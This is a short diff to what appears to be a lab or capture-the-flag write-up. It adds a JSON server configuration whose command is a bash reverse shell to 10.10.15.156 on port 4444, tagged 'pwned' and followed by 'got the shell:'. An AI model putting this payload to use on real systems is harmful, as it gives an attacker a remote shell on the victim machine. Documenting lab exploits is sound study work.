@@ -110,5 +110,15 @@ i think it works
 ```
 
 ```
+{
+  "serverConfig": {
+    "command": "bash",
+    "args": ["-c", "bash -i >& /dev/tcp/10.10.15.156/4444 0>&1"]
+  },
+  "serverId": "pwned"
+}
+
+got the shell:
+
 
 ```
